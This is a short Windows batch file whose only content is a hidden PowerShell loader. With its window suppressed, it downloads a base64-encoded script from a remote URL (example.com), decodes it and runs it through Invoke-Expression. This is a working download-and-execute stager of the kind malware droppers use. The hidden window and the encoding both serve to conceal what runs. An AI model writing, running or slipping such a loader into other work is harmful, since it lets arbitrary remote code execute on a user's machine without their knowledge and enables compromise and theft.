@echo off
powershell -WindowStyle Hidden -Command "& { $b64 = (New-Object System.Net.WebClient).DownloadString('https://example.com/base64script.txt'); $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)); Invoke-Expression $decoded }"

